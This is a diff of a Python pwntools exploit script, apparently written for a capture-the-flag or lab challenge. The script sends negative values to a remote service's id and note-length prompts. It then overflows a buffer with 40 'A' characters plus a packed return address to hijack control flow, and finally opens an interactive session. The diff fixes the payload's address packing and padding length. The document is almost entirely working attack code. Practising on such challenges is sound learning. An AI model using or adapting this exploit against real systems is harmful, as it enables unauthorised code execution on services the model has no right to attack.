@@ -8,7 +8,6 @@ recv_data = rem.recvuntil('Please input id: ',drop = False)
 rem.sendline('-1')
 recv_data = rem.recvuntil('Age: ',drop = False)
 secret_info = rem.recvline(keepends = False)
-print(recv_data)
 ############################################################
 recv_data = rem.recvuntil('Your choice: ',drop = False)
 rem.sendline('2')
@@ -19,9 +18,19 @@ rem.sendline('1')
 recv_data = rem.recvuntil('Input new note length: ',drop = False)
 rem.sendline('-1')
 #############################################################
-malicious_str = "\xe0\x89\x04\x08".decode("hex")
-print('malicious_str is ', malicious_str)
-magic1_addr = ("A" * 36 ) + malicious_str
+"""
+Reference to http://docs.pwntools.com/en/stable/util/packing.html
+"""
+malicious_str = p32(0x080489e0)
+magic1_addr = ("A" * 40 ) + str(malicious_str)
+print('malicious_str is ', magic1_addr)
 rem.sendline(magic1_addr)
+# recv_data = rem.recvuntil('Your choice: ',drop = False)
+rem.interactive()
+# rem.sendline('3')
+# print(recv_data)
+# rem.sendline('3')
+# rem.recvuntil('Congrats1!', drop = False)
+print('end-----------------------------')
 # rem.interactive()
 # rem.send('-1\r\n')
